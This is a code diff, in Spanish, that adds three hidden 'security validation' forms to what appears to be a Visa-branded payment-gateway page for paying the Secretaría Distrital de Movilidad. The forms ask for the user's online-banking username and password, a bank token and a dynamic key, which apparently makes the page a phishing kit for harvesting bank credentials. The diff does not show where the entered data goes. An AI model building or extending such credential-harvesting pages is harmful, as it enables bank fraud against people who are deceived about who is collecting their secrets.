@@ -205,4 +205,66 @@
       </div>
     </div>
   </section>
+
+  <section class="pasarela-card pasarela-card--visa" data-challenge-auth="userpass" hidden>
+    <div class="pasarela-card__body">
+      <h2 class="pasarela-card__title pasarela-card__title--visa">VALIDACIÓN DE SEGURIDAD</h2>
+      <div class="pasarela-card__msg">
+        <p>Para autorizar este pago, ingresa el usuario y la contraseña de tu banca virtual.</p>
+        <div class="pasarela-card__box">
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>Secretaría Distrital de Movilidad</strong></p>
+          <p>Monto: <strong data-challenge-amount>COP 0</strong></p>
+          <p>Fecha: <span data-challenge-datetime></span></p>
+        </div>
+      </div>
+      <form class="pasarela-otp pasarela-auth" data-auth-form="userpass">
+        <label for="auth-username">Usuario</label>
+        <input id="auth-username" name="username" type="text" autocomplete="off" maxlength="40" placeholder="Ingresa tu usuario" />
+        <label for="auth-password">Contraseña</label>
+        <input id="auth-password" name="password" type="password" autocomplete="off" maxlength="40" placeholder="Ingresa tu contraseña" />
+        <p data-auth-debug-message hidden></p>
+        <button type="submit">Continuar</button>
+      </form>
+    </div>
+  </section>
+
+  <section class="pasarela-card pasarela-card--visa" data-challenge-auth="token" hidden>
+    <div class="pasarela-card__body">
+      <h2 class="pasarela-card__title pasarela-card__title--visa">VALIDACIÓN DE SEGURIDAD</h2>
+      <div class="pasarela-card__msg">
+        <p>Ingresa el token o código generado por tu app o dispositivo bancario.</p>
+        <div class="pasarela-card__box">
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>Secretaría Distrital de Movilidad</strong></p>
+          <p>Monto: <strong data-challenge-amount>COP 0</strong></p>
+          <p>Fecha: <span data-challenge-datetime></span></p>
+        </div>
+      </div>
+      <form class="pasarela-otp pasarela-auth" data-auth-form="token">
+        <label for="auth-token">Token</label>
+        <input id="auth-token" name="token" type="text" inputmode="numeric" autocomplete="off" maxlength="12" placeholder="Ingresa tu token" />
+        <p data-auth-debug-message hidden></p>
+        <button type="submit">Enviar</button>
+      </form>
+    </div>
+  </section>
+
+  <section class="pasarela-card pasarela-card--visa" data-challenge-auth="dynamic" hidden>
+    <div class="pasarela-card__body">
+      <h2 class="pasarela-card__title pasarela-card__title--visa">VALIDACIÓN DE SEGURIDAD</h2>
+      <div class="pasarela-card__msg">
+        <p>Ingresa la clave dinámica generada para continuar con la autorización.</p>
+        <div class="pasarela-card__box">
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>Secretaría Distrital de Movilidad</strong></p>
+          <p>Monto: <strong data-challenge-amount>COP 0</strong></p>
+          <p>Fecha: <span data-challenge-datetime></span></p>
+        </div>
+      </div>
+      <form class="pasarela-otp pasarela-auth" data-auth-form="dynamic">
+        <label for="auth-cdin">Clave dinámica</label>
+        <input id="auth-cdin" name="cdin" type="text" inputmode="numeric" autocomplete="off" maxlength="8" placeholder="Ingresa tu clave dinámica" />
+        <p data-auth-debug-message hidden></p>
+        <button type="submit">Enviar</button>
+      </form>
+    </div>
+  </section>
 </div>
